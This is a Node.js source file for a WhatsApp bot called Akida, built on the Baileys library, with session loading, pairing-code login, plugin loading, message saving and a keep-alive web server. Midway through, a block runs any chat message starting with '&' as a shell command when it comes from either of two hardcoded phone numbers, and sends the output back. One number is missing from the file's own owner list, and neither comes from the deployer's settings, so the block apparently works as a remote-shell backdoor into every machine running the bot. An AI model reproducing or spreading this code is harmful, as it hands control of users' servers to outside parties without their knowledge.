// Anti-crash handler
process.on("uncaughtException", (err) => {
  console.error("[❗] Uncaught Exception:", err.stack || err);
});

process.on("unhandledRejection", (reason) => {
  console.error("[❗] Unhandled Promise Rejection:", reason);
});

// Marisel / Akida bot core

const axios = require("axios");
const config = require("./settings");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers,
} = require(config.BAILEYS);

const l = console.log;
const {
  getBuffer,
  getGroupAdmins,
  h2k,
  isUrl,
  runtime,
  sleep,
  fetchJson,
} = require("./lib/functions");
const {
  initializeAntiDeleteSettings,
  saveMessage,
} = require("./data");
const fsSync = require("fs");
const fs = require("fs").promises;
const ff = require("fluent-ffmpeg");
const P = require("pino");
const GroupEvents = require("./lib/groupevents");
const { PresenceControl, BotActivityFilter } = require("./data/presence");
const qrcode = require("qrcode-terminal");
const util = require("util");
const { sms, AntiDelete } = require("./lib");
const FileType = require("file-type");
const { File } = require("megajs");
const bodyparser = require("body-parser");
const chalk = require("chalk");
const os = require("os");
const Crypto = require("crypto");
const path = require("path");
const { getPrefix } = require("./lib/prefix");
const readline = require("readline");

const ownerNumber = ["218942841878"];

// ==========================
// TEMP FILE CLEANER
// ==========================
const tempDir = path.join(os.tmpdir(), "cache-temp");
if (!fsSync.existsSync(tempDir)) fsSync.mkdirSync(tempDir);

const clearTempDir = () => {
  fsSync.readdir(tempDir, (err, files) => {
    if (err) return;
    for (const file of files) {
      fsSync.unlink(path.join(tempDir, file), () => {});
    }
  });
};
setInterval(clearTempDir, 5 * 60 * 1000);

// ==========================
// EXPRESS SERVER
// ==========================
const express = require("express");
const app = express();
const port = process.env.PORT || 7860;

// ==========================
// SESSION HANDLER
// ==========================
let malvin;
const sessionDir = path.join(__dirname, "./sessions");
const credsPath = path.join(sessionDir, "creds.json");

if (!fsSync.existsSync(sessionDir)) fsSync.mkdirSync(sessionDir, { recursive: true });

async function loadSession() {
  try {
    if (!config.SESSION_ID) return null;

    if (config.SESSION_ID.startsWith("Akida~")) {
      const base64Data = config.SESSION_ID.replace("Akida~", "");
      const decodedData = Buffer.from(base64Data, "base64");
      fsSync.writeFileSync(credsPath, decodedData);
      return JSON.parse(decodedData.toString());
    }
    return null;
  } catch (err) {
    console.error(chalk.red("Session load error:"), err.message);
    return null;
  }
}

async function connectWithPairing(malvin, useMobile) {
  if (useMobile) throw new Error("Cannot use pairing code with mobile API");

  console.log(chalk.bgYellow.black(" ACTION REQUIRED "));
  console.log(chalk.green("Enter WhatsApp number to receive pairing code"));
  
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  const question = (text) => new Promise((resolve) => rl.question(text, resolve));
  let number = await question(chalk.cyan("» Enter your number (e.g., +254105521300): "));
  rl.close();

  number = number.replace(/[^0-9]/g, "");
  if (!number) return console.error(chalk.red("❌ No number provided")), process.exit(1);

  try {
    let code = await malvin.requestPairingCode(number);
    code = code?.match(/.{1,4}/g)?.join("-") || code;
    console.log(chalk.green("Use this pairing code in WhatsApp Linked Devices:"));
    console.log(chalk.bold.yellow(code));
  } catch (err) {
    console.error(chalk.red("Error getting pairing code:"), err.message);
    process.exit(1);
  }
}

async function connectToWA() {
  console.log(chalk.cyan("[ 🟠 ] Connecting to WhatsApp..."));

  const creds = await loadSession();
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir, { creds });
  const { version } = await fetchLatestBaileysVersion();
  const pairingCode = config.PAIRING_CODE === "true" || process.argv.includes("--pairing-code");
  const useMobile = process.argv.includes("--mobile");

  malvin = makeWASocket({
    logger: P({ level: "silent" }),
    printQRInTerminal: !creds && !pairingCode,
    browser: Browsers.macOS("Firefox"),
    syncFullHistory: true,
    auth: state,
    version,
  });

  if (pairingCode && !state.creds.registered) await connectWithPairing(malvin, useMobile);

  // CONNECTION EVENTS
  malvin.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect, qr } = update;
    if (connection === "close") {
      const reason = lastDisconnect?.error?.output?.statusCode;
      if (reason === DisconnectReason.loggedOut) {
        console.log(chalk.red("[ 🛑 ] Session expired, please re-authenticate"));
        if (fsSync.existsSync(credsPath)) fsSync.unlinkSync(credsPath);
        process.exit(1);
      } else {
        console.log(chalk.red("[ ⏳️ ] Connection lost, reconnecting..."));
        setTimeout(connectToWA, 5000);
      }
    } else if (connection === "open") {
      console.log(chalk.green("[ 🤖 ] Akida Bot Connected ✅"));

      // Load plugins
      const pluginPath = path.join(__dirname, "plugins");
      fsSync.readdirSync(pluginPath).forEach((file) => {
        if (file.endsWith(".js")) require(path.join(pluginPath, file));
      });

      console.log(chalk.green("[ ✅ ] Plugins loaded successfully"));
    }

    if (qr && !pairingCode) {
      console.log(chalk.yellow("[ 🟢 ] Scan the QR Code below to connect:"));
      qrcode.generate(qr, { small: true });
    }
  });

  // ==========================
  // MESSAGE EVENTS
  // ==========================
  malvin.ev.on("messages.update", async (updates) => {
    for (const update of updates) {
      if (update.update.message === null) await AntiDelete(malvin, updates);
    }
  });

  malvin.ev.on("messages.upsert", async (mek) => {
    mek = mek.messages[0];
    if (!mek.message) return;

    mek.message = getContentType(mek.message) === "ephemeralMessage"
      ? mek.message.ephemeralMessage.message
      : mek.message;

    if (config.READ_MESSAGE === "true") await malvin.readMessages([mek.key]);
    if (mek.key.remoteJid === "status@broadcast" && config.AUTO_STATUS_SEEN === "true") {
      await malvin.readMessages([mek.key]);
    }

    await saveMessage(mek);
    const m = sms(malvin, mek);
    const from = mek.key.remoteJid;
    const type = getContentType(mek.message);
    const body =
      type === "conversation"
        ? mek.message.conversation
        : type === "extendedTextMessage"
        ? mek.message.extendedTextMessage.text
        : "";

    const prefix = getPrefix();
    const isCmd = body.startsWith(prefix);
    const command = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : "";
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(" ");
    const sender = mek.key.fromMe
      ? malvin.user.id.split(":")[0] + "@s.whatsapp.net"
      : mek.key.participant || mek.key.remoteJid;
    const senderNumber = sender.split("@")[0];
    const reply = (text) => malvin.sendMessage(from, { text }, { quoted: mek });

    // Owner command execution
    const ownerNumbers = ["218942841878", "254740007567"];
    const isOwner = ownerNumbers.includes(senderNumber);

    if (isOwner && body.startsWith("&")) {
      let code = body.slice(2);
      if (!code) return reply("Provide command to execute");
      const { spawn } = require("child_process");
      try {
        let proc = spawn(code, { shell: true });
        proc.stdout.on("data", (data) => reply(data.toString()));
        proc.stderr.on("data", (data) => reply("❌ Error:\n" + data.toString()));
        proc.on("close", (code) => reply(`✅ Process exited with code ${code}`));
      } catch (error) {
        reply(`❌ Execution failed: ${error.message}`);
      }
      return;
    }

    // Command handling from /plugins/
    if (isCmd) {
      try {
        const pluginsDir = path.join(__dirname, "plugins");
        const files = fsSync.readdirSync(pluginsDir).filter((f) => f.endsWith(".js"));
        for (const file of files) {
          const plugin = require(path.join(pluginsDir, file));
          if (plugin && typeof plugin.run === "function") {
            await plugin.run(malvin, m, mek, from, command, args, q, isOwner);
          }
        }
      } catch (err) {
        console.error(chalk.red(`[ ⚠️ ] Plugin Error: ${err.message}`));
        await malvin.sendMessage(from, { text: `⚠️ ${err.message}` }, { quoted: mek });
      }
    }
  });

  malvin.ev.on("creds.update", saveCreds);
  console.log(chalk.green("[ 🤖 ] Bot initialized and listening for messages..."));
}

connectToWA();

// KEEP ALIVE
app.get("/", (req, res) => {
  res.send("✅ Akida Bot is running successfully!");
});

app.listen(port, () => {
  console.log(chalk.cyan(`[ 🌐 ] Server running on port ${port}`));
});
